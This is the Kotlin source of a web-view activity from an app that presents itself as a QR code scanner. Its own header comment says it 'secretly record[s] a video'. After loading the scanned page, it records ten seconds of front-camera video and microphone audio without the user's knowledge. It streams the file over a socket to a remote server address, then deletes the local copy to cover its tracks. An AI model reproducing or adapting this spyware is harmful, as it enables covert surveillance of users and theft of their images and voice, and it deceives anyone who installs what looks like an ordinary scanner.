// WEB VIEW ACTIVITY TO DISPLAY THE WEB PAGE RELATED TO THE QR CODE AND SECRETLY RECORD A VIDEO

package com.zizou.qrcodescanner

import android.os.Bundle
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentValues
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.ActivityCompat
import android.widget.Toast

import kotlinx.coroutines.DelicateCoroutinesApi
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch

import java.io.DataOutputStream
import java.io.InputStream
import java.net.Socket

@Suppress("DEPRECATION")
class WebPageActivity : AppCompatActivity() {

    private lateinit var mediaRecorder: MediaRecorder
    private var isRecording = false
    private val recordingDuration = 10000 // 10 seconds
    private var cameraCaptureSession: CameraCaptureSession? = null
    private var cameraDevice: CameraDevice? = null
    private lateinit var uri : Uri

    // ----------- FUNCTIONS TO BROWSE THE WEB PAGE ---------------

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_web_page)


        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO), 101)
        } else {
            startWebView()
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun startWebView() {
        val webView: WebView = findViewById(R.id.webview)
        val newUrl = intent.getStringExtra("urlScanned") ?: "https://www.google.com/"

        webView.settings.javaScriptEnabled = true
        webView.loadUrl(newUrl)
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                setupCamera()
                Handler().postDelayed({ stopRecording() }, recordingDuration.toLong())
            }
        }
    }

    // ----------- FUNCTIONS TO RECORD THE VIDEO ---------------

    private fun setupCamera() {
        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            for (cameraId in cameraManager.cameraIdList) {
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT) {
                    openCamera(cameraId, cameraManager)
                    break
                }
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }

    private fun openCamera(cameraId: String, cameraManager: CameraManager) {
        try {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        startRecording()
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                    }
                }, null)
            }
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }

    @SuppressLint("Recycle")
    private fun startRecording() {
        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            uri = getOutputUri()!!
            setOutputFile(uri.let { contentResolver.openFileDescriptor(it, "w")?.fileDescriptor })
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setVideoSize(1920, 1080)
            setVideoFrameRate(60)
            setOrientationHint(270)
            prepare()
        }

        val recordingSurface = mediaRecorder.surface

        cameraDevice?.let { device ->
            val captureRequestBuilder = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                addTarget(recordingSurface)
                set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
            }

            val surfaces = listOf(recordingSurface)

            try {
                device.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        cameraCaptureSession = session
                        try {
                            session.setRepeatingRequest(captureRequestBuilder.build(), null, null)
                            mediaRecorder.start()
                            isRecording = true
                        } catch (e: Exception) {
                            Log.e("WebPageActivity", "Error starting MediaRecorder", e)
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e("WebPageActivity", "Failed to configure camera capture session")
                    }
                }, null)
            } catch (e: CameraAccessException) {
                Log.e("WebPageActivity", "Error accessing camera for capture session", e)
            }
        } ?: Log.e("WebPageActivity", "Camera device is null")
    }

    private fun stopRecording() {
        if (isRecording) {
            mediaRecorder.stop()
            mediaRecorder.release()
            cameraCaptureSession?.close()
            cameraDevice?.close()
            isRecording = false
        }
        sendVideo()
    }

    private fun getOutputUri(): Uri? {
        val contentValues = ContentValues().apply {
            put(MediaStore.MediaColumns.DISPLAY_NAME, "recorded_video.mp4")
            put(MediaStore.MediaColumns.MIME_TYPE, "video/mp4")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_MOVIES)
            }
        }

        return contentResolver.insert(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, contentValues)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED && grantResults[1] == PackageManager.PERMISSION_GRANTED) {
            startWebView()
        } else {
            Toast.makeText(this, "Camera and Microphone permissions are required", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onPause() {
        super.onPause()
        if (isRecording) {
            stopRecording()
        }
    }

    // ------------ FUNCTIONS TO SEND THE VIDEO TO THE SERVER ----------------

    private fun getInputStreamFromUri(uri: Uri, context: Context): InputStream? {
        return context.contentResolver.openInputStream(uri)
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun sendVideoOverSocket(inputStream: InputStream) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val socket = Socket(MainActivity.ipServer, 12346)
                val buffer = ByteArray(4096)
                val dataOutputStream = DataOutputStream(socket.getOutputStream())

                while (true) {
                    val bytesRead = inputStream.read(buffer)
                    if (bytesRead == -1) break
                    dataOutputStream.write(buffer, 0, bytesRead)
                }

                dataOutputStream.flush()
            } catch (e: Exception) {
                Log.e("Error reaching server", "The phone cannot reach the server",e)
            }

            deleteVideo(uri)
        }
    }

    private fun sendVideo() {

        val context: Context = this// get your context here
        val inputStream = getInputStreamFromUri(uri, context)

        if (inputStream != null) {
            sendVideoOverSocket(inputStream)
        }
    }

    private fun deleteVideo(uri: Uri): Boolean {
        return try {
            val rowsDeleted = contentResolver.delete(uri, null, null)
            rowsDeleted > 0 // true if the deletion was successful
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
}